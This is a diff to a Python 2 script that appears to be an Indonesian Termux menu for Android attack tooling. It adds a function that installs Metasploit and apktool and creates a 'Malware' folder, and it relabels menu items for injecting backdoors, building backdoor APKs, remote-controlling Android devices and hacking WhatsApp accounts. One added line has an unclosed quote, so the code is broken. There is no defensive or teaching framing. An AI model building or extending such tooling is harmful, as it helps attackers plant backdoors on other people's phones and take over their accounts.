@@ -45,13 +45,13 @@ else :
     exit()
   else :
     if confirm== ' ':
-      os.system('python2 msfgaf.py')
+      os.system('python2 msfkuy.py')
     else :
-      os.system('python2 msfgaf.py')
+      os.system('python2 msfkuy.py')
       
 confirm=raw_input('SUDAH AKTIFKAN OPENVPN ?  y/n : ')
 if confirm== '' :
-	os.system('python2 msfgaf.py')
+	os.system('python2 msfkuy.py')
 else :
 	if confirm== 'y' :
 		print ' '
@@ -273,17 +273,28 @@ def baru():
     os.system('am start --user 0 -n com.haibison.apksigner/app.activities.MainActivity')
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     home()
+def bahan():
+    flush(putih+'Anda akan menginstall Metasploit Framework')
+    flush(putih+'Akan memerlukan waktu 30 menit hingga 1 jam')
+    os.system('apt install metasploit -y)
+    flush(putih+'Menginstall Apktool')
+    nxt()
+    os.system('dpkg -i apktool.deb')
+    os.system('rm -rf apktool.deb')
+    os.system('mkdir Malware')
+    home()
 
 def menu():
     os.system('clear')
     time.sleep(1)
     logo()
-    print '\x1b[1;91m1.\x1b[1;97mInject Bacdoor '
-    print '\x1b[1;91m2.\x1b[1;97mBuat Backdoor Baru        '
-    print '\x1b[1;91m3.\x1b[1;97mRemote Android '
-    print '\x1b[1;91m4.\x1b[1;97mHack Akun Wa'
-    print '\x1b[1;91m5.\x1b[1;97mUpdate--'
-    print '\x1b[1;91m6.\x1b[1;97mExit'
+    print '\x1b[1;91m0.\x1b[1;97mINSTALL BAHAN BAHAN YANG DIPERLUKAN  '
+    print '\x1b[1;91m1.\x1b[1;97mINJECT BACKDOOR '
+    print '\x1b[1;91m2.\x1b[1;97mBUAT BACKDOOR APK BARU        '
+    print '\x1b[1;91m3.\x1b[1;97mREMOTE ANDROID '
+    print '\x1b[1;91m4.\x1b[1;97mHACK AKUN WA'
+    print '\x1b[1;91m5.\x1b[1;97mUPDATE SCRIPT--'
+    print '\x1b[1;91m6.\x1b[1;97mEXIT'
     print '\r\x1b[1;91m______________________________« Pilih MENU » '
 
 def pilih():
